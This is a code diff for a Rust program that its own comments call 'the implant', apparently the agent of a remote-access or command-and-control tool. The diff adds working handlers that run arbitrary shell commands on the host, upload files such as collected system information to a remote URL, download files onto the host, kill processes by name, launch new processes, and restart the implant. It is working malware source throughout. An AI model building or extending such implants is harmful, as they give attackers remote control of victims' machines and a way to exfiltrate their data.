@@ -1,11 +1,18 @@
+use nix::sys::signal::{kill, Signal};
+use nix::unistd::{execvp, fork, ForkResult, Pid};
+use std::ffi::CString;
 use std::path::Path;
 use std::process::Command;
 use uuid::Uuid;
 
 use crate::commands::{download, upload};
+use crate::sysinfo::saver::get_pids_by_name;
 
 const DEFAULT_SYSINFO_FILE: &str = "sysinfo.dat";
 
+/**
+ * Function that determines the command type to be executed and executes it.
+ */
 pub async fn execute_command(
     uuid: Uuid,
     cmd: &str,
@@ -17,23 +24,27 @@ pub async fn execute_command(
     let mut output = String::new();
 
     match *cmd_type {
+        // shell <shell commands>
         "shell" => output = execute_shell_command(cmd_parts)?,
         // upload <file_name>(optional)
         "upload" => output = execute_upload_command(uuid, cmd_parts, upload_url).await?,
         // download <file_id> <file_save_path>
         "download" => output = execute_download_command(uuid, cmd_parts, download_url).await?,
-        // "kill" => execute_kill_command(cmd_parts),
-        // "start" => execute_start_command(cmd_parts),
-        // "restart" => execute_restart_command(cmd_parts),
-        _ => {
-            println!("Unsupported command type: {}", cmd_type);
-            return Err(format!("Unsupported command type: {}", cmd_type).into());
-        }
+        // kill <process id or name>
+        "killall" => output = execute_kill_command(cmd_parts)?,
+        "start" => output = execute_start_command(cmd_parts)?,
+        "restart" => output = execute_restart_command()?,
+        _ => return Err(format!("Unsupported command type: {}", cmd_type).into()),
     }
 
     Ok(output)
 }
 
+/**
+ * Function that executes shell commands.
+ * Usage: ```shell <shell command>```
+ * (e.g. ```shell whoami```)
+ */
 fn execute_shell_command(cmd_parts: Vec<&str>) -> Result<String, Box<dyn std::error::Error>> {
     if cmd_parts.len() <= 1 {
         println!("Could not execute shell command.");
@@ -60,7 +71,9 @@ fn execute_shell_command(cmd_parts: Vec<&str>) -> Result<String, Box<dyn std::er
 }
 
 /**
- * Function to execute "upload" commands, will upload the default sysinfo file if the file name is not provided
+ * Function to execute "upload" commands, will upload the default sysinfo file if the file name is not provided.
+ * Usage: ```upload <filename>(optional)```
+ * (e.g. ```upload rickroll.mp4```)
  */
 async fn execute_upload_command(
     uuid: Uuid,
@@ -89,8 +102,11 @@ async fn execute_upload_command(
         file_to_send
     ))
 }
+
 /**
- * Function to execute "download" commands, file id and save path needs to be provided to the download command
+ * Function to execute "download" commands, file id and save path needs to be provided to the download command.
+ * Usage: ```download <file name> <save path on host>```
+ * (e.g. ```download rickroll.mp4 /home/user/Desktop```)
  */
 async fn execute_download_command(
     uuid: Uuid,
@@ -117,23 +133,82 @@ async fn execute_download_command(
     ))
 }
 
-fn execute_kill_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    // Implement kill logic here
-    println!("Executing kill command: {}", cmd);
-    // Example: Terminate a process or service
-    Ok("some string".to_string())
+/**
+ * Function that kills processes with the given process id.
+ * Usage: ```killall <process name>```
+ * (e.g. ```killall ping```)
+ */
+fn execute_kill_command(cmd: Vec<&str>) -> Result<String, Box<dyn std::error::Error>> {
+    if cmd.len() < 2 {
+        return Err("Missing argument: process name".into());
+    }
+
+    let process_name = cmd[1];
+    let pids = get_pids_by_name(process_name);
+
+    if pids.is_empty() {
+        return Err(format!("No processes found with name: {}", process_name).into());
+    }
+
+    for pid in pids {
+        let pid = Pid::from_raw(pid);
+        kill(pid, Signal::SIGKILL)?;
+    }
+
+    Ok(format!(
+        "Successfully killed processes with name: {}",
+        process_name
+    ))
 }
 
-fn execute_start_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    // Implement start logic here
-    println!("Executing start command: {}", cmd);
-    // Example: Start a process or service
-    Ok("some string".to_string())
+/**
+ * Function that starts processes with given names, the command also allows giving arguments to the new process.
+ * Usage: ```start <filename> <args>(optional)```
+ * (e.g. ```start ping google.com```)  
+ */
+fn execute_start_command(cmd: Vec<&str>) -> Result<String, Box<dyn std::error::Error>> {
+    if cmd.len() < 2 {
+        return Err("Missing argument: command to start".into());
+    }
+
+    let command_to_start = cmd[1];
+
+    let args: Vec<CString> = cmd[1..].iter().map(|&s| CString::new(s).unwrap()).collect();
+    let c_command = CString::new(command_to_start).unwrap();
+
+    match unsafe { fork()? } {
+        ForkResult::Parent { .. } => Ok(format!(
+            "Successfully started command: {}",
+            command_to_start
+        )),
+        ForkResult::Child => {
+            execvp(&c_command, &args)?;
+            unreachable!()
+        }
+    }
 }
 
-fn execute_restart_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    // Implement restart logic here
-    println!("Executing restart command: {}", cmd);
-    // Example: Restart a process or service
-    Ok("some string".to_string())
+/**
+ * The function that adds restart functionality to the implant. The command does not take any arguments.
+ * Usage: ```restart```
+ */
+fn execute_restart_command() -> Result<String, Box<dyn std::error::Error>> {
+    // Get the current executable path
+    let current_exe = std::env::current_exe()?;
+    let exe_path = current_exe
+        .to_str()
+        .ok_or("Failed to get executable path")?;
+
+    // Fork the current process
+    match unsafe { fork()? } {
+        ForkResult::Parent { .. } => {
+            std::process::exit(0);
+        }
+        ForkResult::Child => {
+            // Child process restarts the executable
+            let c_exe_path = CString::new(exe_path)?;
+            execvp(&c_exe_path, &[&c_exe_path])?;
+            unreachable!()
+        }
+    }
 }
